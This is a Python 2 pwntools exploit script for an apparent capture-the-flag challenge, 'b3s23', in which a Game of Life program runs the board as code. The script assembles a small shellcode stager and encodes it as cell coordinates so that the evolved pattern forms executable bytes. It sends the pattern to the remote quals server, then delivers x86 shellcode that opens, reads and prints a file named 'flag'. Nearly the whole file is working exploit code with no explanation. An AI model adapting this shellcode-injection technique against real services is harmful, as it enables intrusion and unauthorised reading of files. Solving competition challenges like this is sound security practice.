#!/usr/bin/env python

from pwn import *
import textwrap

# buffer writer
a = '''
or al, 3
xchg ecx, ebx
shl edx, 12
int 0x80
'''

a = asm(a)
binstr = ''.join('{0:08b}'.format(ord(x), 'b') for x in a)
for line in textwrap.wrap(binstr, 110):
	print line
print a.encode('hex')
print len(a)

# for GDB test
buf_address = 0xf7fd3000

readcode_len = len(a)

if len(a) % 4 != 0:
	a = a.ljust(len(a) + (4 - len(a)%4), '\x00')

for i in range(0, len(a), 4):
	print "set *0x%08x = 0x%08x" % (buf_address + i, u32(a[i:i+4]))

# real pwn
target = """
000011000000001110000111110110011100000111100010000011001100110110000000
"""

payload = '''
00001100000000111000011111011001110000000001001000001100110011011000000000000000000000000000000000000000
00001100000001001000100001011001001000000100100000001100110011011000000000000000000000000000000000000000
00000000000001100000101000000000011001001101111100000000000000000000000000000000000000000000000000000000
00000000000000000000011000000000000001001001000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000011010000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
'''

p = remote('b3s23_28f1ea914f8c873d232da030d4dd00e8.quals.shallweplayaga.me', 2323)
#p = process('b3s23')

p.recvuntil('to run.\n')

payload = payload.strip()
for y in reversed(range(len(payload.split()))):
	line = payload.split()[y]
	for x in reversed(range(len(line))):
		if line[x] == '1':
			p.sendline('%d,%d' % (x, y))
p.sendline('a')

p.interactive()

sh = '''
/* open */
push 0
push 0x67616c66
mov ebx,esp
mov ecx,0
mov edx,0
mov eax,5
int 0x80
/* read */
mov ebx,eax
mov eax,3
mov ecx,esp
mov edx,100
int 0x80
/* write */
mov edx,eax
mov ecx,esp
mov eax,4
mov ebx,1
int 0x80
'''
p.sendline('\x90' * readcode_len + asm(sh))

print p.recvall()
